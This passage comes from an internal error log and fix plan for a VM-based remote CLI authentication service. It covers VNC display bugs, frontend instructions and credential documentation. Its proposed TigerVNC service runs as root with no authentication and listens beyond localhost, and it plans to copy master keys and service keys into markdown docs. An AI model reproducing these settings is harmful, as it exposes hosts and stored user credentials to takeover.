- Clean up abandoned VMs automatically

**Current Status**: Wide open - no limits

---

### ERROR #23: Missing Supabase Credentials in Documentation
**Severity**: 🟡 MEDIUM - OPERATIONAL
**Status**: ⏳ NEED TO EXTRACT

**Problem**:
- Supabase connection details not documented
- Cannot recover if credentials lost
- No backup of database schema

**Required Information**:
- Supabase project URL
- Service role key
- Database password
- Table schemas

**Action**: Extract from `/master-controller/src/db/supabase.js`

---

### ERROR #24: Missing Decodo Proxy Credentials
**Severity**: 🟡 MEDIUM - OPERATIONAL
**Status**: ⏳ NEED TO EXTRACT

**Problem**:
- Decodo proxy credentials not documented
- Cannot reconfigure if lost
- No documentation of how to get new proxy ports

**Required Information**:
- Decodo account credentials
- API key (if any)
- Port allocation mechanism
- Proxy authentication method

**Action**: Extract from code and config files

---

### ERROR #25: Missing Encryption Master Key
**Severity**: 🔴 CRITICAL - SECURITY/OPERATIONAL
**Status**: ⏳ NEED TO EXTRACT

**Problem**:
- Encryption master key not documented
- If lost, cannot decrypt stored credentials
- Users would be locked out permanently

**Required Information**:
- Master encryption key
- Key derivation method
- Where it's stored (environment variable? file?)
- Backup/recovery procedure

**Action**: Extract from code - URGENT

---

## SUMMARY OF ERRORS BY SEVERITY

### CRITICAL (Blocking Production) 🔴

1. ❌ **VNC Display Shows Small Window** - Week 4, unresolved
2. ❌ **No Terminal/Browser Auto-Opening** - Not implemented
3. ❌ **Missing Encryption Master Key Documentation** - Security risk
4. ✅ **DDoS Attack (Nomad)** - RESOLVED
5. ✅ **UFW Firewall Disabled** - RESOLVED

### HIGH Priority 🟠

6. ❌ **Terminal Window Not Auto-Opening** - UX blocker
7. ❌ **Firefox Not Auto-Opening** - UX blocker
8. ❌ **Instructions Don't Show Command** - UX confusion
9. ⚠️ **VM Health Check Timeouts** - Mitigated but still occurring
10. ⚠️ **Stale Sessions Persisting** - Ongoing issue
11. ⚠️ **VNC WebSocket Failures** - Partially mitigated
12. ✅ **WebRTC Race Condition** - RESOLVED
13. ❌ **XFCE Not Starting** - Display issue
14. ❌ **Missing vncserver Command** - Prevents fix

### MEDIUM Priority 🟡

15. ⏳ **Console Logs Deleted** - Fix implemented, not tested
16. ❌ **No OAuth Flow Validation** - Not implemented
17. ❌ **No Rate Limiting** - Not implemented
18. ⏳ **Missing Supabase Credentials** - Need to extract
19. ⏳ **Missing Decodo Credentials** - Need to extract
20. ⏳ **Golden Rootfs Clone Timeout** - Mitigated
21. ⚠️ **Hardcoded VPS IP** - Exists in code

### LOW Priority 🟢

22. ✅ **Network Interface Naming** - RESOLVED
23. ⏳ **No Monitoring/Observability** - Planned

---

## REQUIRED FIXES FOR CORRECT UX

### FIX #1: Rebuild Golden Rootfs with Proper Configuration

**What Needs to Be in Golden Rootfs**:

**1. Proper TigerVNC Installation**:
```bash
apt-get install tigervnc-standalone-server
# Must include vncserver wrapper script
# Verify: which vncserver
```

**2. XFCE Auto-Launch Configuration**:
```bash
mkdir -p /root/.vnc
cat > /root/.vnc/xstartup <<'EOF'
#!/bin/sh
# Start D-Bus session
if [ -z "$DBUS_SESSION_BUS_ADDRESS" ]; then
  eval $(dbus-launch --sh-syntax)
fi

# Unset problematic variables
unset SESSION_MANAGER

# Start XFCE desktop
exec startxfce4
EOF
chmod +x /root/.vnc/xstartup
```

**3. Terminal Auto-Open**:
```bash
mkdir -p /root/.config/autostart
cat > /root/.config/autostart/01-terminal.desktop <<'EOF'
[Desktop Entry]
Type=Application
Name=Terminal
Exec=xfce4-terminal --maximize --hide-menubar --title="Polydev CLI - Type: claude, codex, or gemini"
Terminal=false
StartupNotify=false
X-XFCE-Autostart-Override=true
EOF
```

**4. Firefox Auto-Open**:
```bash
cat > /root/.config/autostart/02-firefox.desktop <<'EOF'
[Desktop Entry]
Type=Application
Name=Firefox
Exec=sh -c "sleep 3 && firefox --new-instance"
Terminal=false
StartupNotify=false
X-XFCE-Autostart-Override=true
EOF
```

**5. TigerVNC Service**:
```bash
cat > /etc/systemd/system/tigervnc.service <<'EOF'
[Unit]
Description=TigerVNC Server (Full XFCE Desktop)
After=network.target

[Service]
Type=forking
User=root
WorkingDirectory=/root
Environment=HOME=/root

# Kill any existing VNC session
ExecStartPre=-/usr/bin/vncserver -kill :1

# Start VNC with vncserver wrapper (executes xstartup)
ExecStart=/usr/bin/vncserver :1 \
  -geometry 1920x1080 \
  -depth 24 \
  -localhost no \
  -rfbport 5901 \
  -SecurityTypes None

ExecStop=/usr/bin/vncserver -kill :1

Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl enable tigervnc
```

**6. Environment Variables**:
```bash
cat >> /etc/environment <<'EOF'
BROWSER=firefox
DISPLAY=:1
XDG_RUNTIME_DIR=/run/user/0
EOF
```

---

### FIX #2: Update Frontend Instructions

**File**: `/src/app/dashboard/remote-cli/auth/page.tsx:696-702`

**Current (WRONG)**:
```typescript
<p className="font-medium mb-1">Run the authentication command in the terminal</p>
<p className="text-sm text-muted-foreground mb-2">
  The CLI tool is already running. Complete the OAuth flow in the terminal above.
</p>
```

**Correct (UPDATED)**:
```typescript
<p className="font-medium mb-1">Type the CLI command in the terminal window</p>
<p className="text-sm text-muted-foreground mb-2">
  You'll see a terminal window inside the VM desktop above. Type the following command and press Enter:
</p>
<div className="p-3 bg-primary/10 rounded-lg border border-primary/20">
  <code className="font-mono text-sm font-semibold">
    {provider === 'claude_code' && '$ claude'}
    {provider === 'codex' && '$ codex'}
    {provider === 'gemini_cli' && '$ gemini'}
  </code>
</div>
<p className="text-xs text-muted-foreground mt-2">
  ℹ️ The CLI will automatically open the OAuth page in Firefox browser inside the VM.
  Complete the authentication in that browser window.
</p>
```

---

### FIX #3: Improve Loading/Error UX

**Current Issues**:
- Generic "Creating VM" message for 2-3 minutes
- No indication of what's happening
- No progress bar
- Timeout shows generic error

**Better UX**:
```typescript
// Show detailed progress steps
const [progressSteps, setProgressSteps] = useState([
  { label: 'Creating VM...', status: 'active' },
  { label: 'Booting operating system...', status: 'pending' },
  { label: 'Starting VNC server...', status: 'pending' },
  { label: 'Starting XFCE desktop...', status: 'pending' },
  { label: 'Opening terminal and browser...', status: 'pending' },
  { label: 'VM ready!', status: 'pending' }
]);

// Update steps as VM boots (poll from backend)
// Show estimated time remaining
// Show retry count if connections fail
```

**Implement**:
- Real-time progress updates from master controller
- Estimated time remaining based on historical data
- Clear error messages with retry buttons
- Timeout countdown ("VM boot in progress: 45s elapsed, 135s remaining...")

---

## MISSING CREDENTIALS TO EXTRACT

### 1. Supabase Database Credentials

**Need from** `/master-controller/src/db/supabase.js`:
- Project URL
- Service role key (anon key)
- Database password (if direct PostgreSQL access)

**Current Location**: Environment variables or code

---

### 2. Decodo Proxy Credentials

**Need from** code/config:
- Decodo account email/password
- API key (if any)
- Port allocation method
- Proxy authentication tokens

**Current Location**: Unknown - need to search codebase

---

### 3. Encryption Master Key

**CRITICAL - Need from** code:
- Master encryption key for AES-256-GCM
- Key derivation function (if any)
- Salt/IV generation method
- Where key is stored

**Current Location**: Search for `crypto.encrypt` or `AES` in codebase

---

### 4. Let's Encrypt SSL Certificate Credentials

**Need**:
- Domain name
- Let's Encrypt account email
- Certificate renewal configuration

**Current Location**: `/etc/letsencrypt/` on VPS (if using Certbot)

---

## IMMEDIATE ACTION PLAN

### Priority 1: Fix VNC Display (This Week)

**Option A: Rebuild Golden Rootfs Properly**
1. Mount golden rootfs
2. Chroot into it
3. Install proper TigerVNC: `apt-get install tigervnc-standalone-server`
4. Verify `vncserver` command exists
5. Create xstartup script
6. Create XFCE autostart entries (terminal + Firefox)
7. Update TigerVNC service to use vncserver wrapper
8. Test with new VM
9. VERIFY full 1920x1080 XFCE desktop with terminal + browser

**Option B: Switch to x11vnc + Xvfb**
1. Use Xvfb as X server (proven to work)
2. Use x11vnc for VNC (proven to work)
3. Start XFCE on Xvfb display
4. Auto-open terminal + Firefox via XFCE autostart
5. Test with new VM

**Recommendation**: Try Option A first (cleaner), fallback to Option B

---

### Priority 2: Update Frontend Instructions

1. Fix instructions in `auth/page.tsx`
2. Show correct CLI command to type
3. Explain OAuth flow clearly
4. Add progress indicators
5. Add better error messages

---

### Priority 3: Extract and Document All Credentials

1. Read `/master-controller/src/db/supabase.js` for Supabase creds
2. Search codebase for Decodo credentials
3. Search for encryption key implementation
4. Document everything in master documentation
5. Create secure backup

---

### Priority 4: Test End-to-End Flow

**Only after VNC is fixed:**
1. User clicks "Connect Claude Code"
2. VM created with full 1920x1080 XFCE desktop
3. Terminal window opens automatically (MAXIMIZED, in focus)
4. Firefox opens automatically (behind terminal)
5. User types: `claude`
6. Claude CLI starts OAuth flow
7. Firefox automatically opens OAuth URL
8. User completes OAuth
9. Credentials encrypted and stored
10. Frontend shows "Successfully Connected!"
11. VM destroyed

**Test each step** and document if it works or fails

---

## NEXT SESSION PROMPT

```
GOAL: Fix VNC display to show full 1920x1080 XFCE desktop with terminal + Firefox auto-opened

CURRENT STATE:
- VNC shows small xterm window (broken)
- Missing vncserver wrapper command
- XFCE not starting properly
- No terminal/browser auto-opening

REQUIRED UX:
- Full 1920x1080 XFCE desktop
- Terminal window MAXIMIZED and in FOCUS
- Firefox browser OPEN (behind terminal)
- User can immediately type CLI command

IMMEDIATE ACTIONS:
1. Mount golden rootfs
2. Chroot and install proper TigerVNC
3. Create xstartup + autostart configs
4. Test with new VM
5. VERIFY it works before proceeding

DOCUMENTATION:
- /Users/venkat/Documents/polydev-ai/CORRECT_UX_REQUIREMENTS_AND_ALL_ERRORS.md
- /Users/venkat/Documents/polydev-ai/POLYDEV_MASTER_SYSTEM_DOCUMENTATION.md
```

---

**END OF COMPREHENSIVE ERROR DOCUMENTATION**
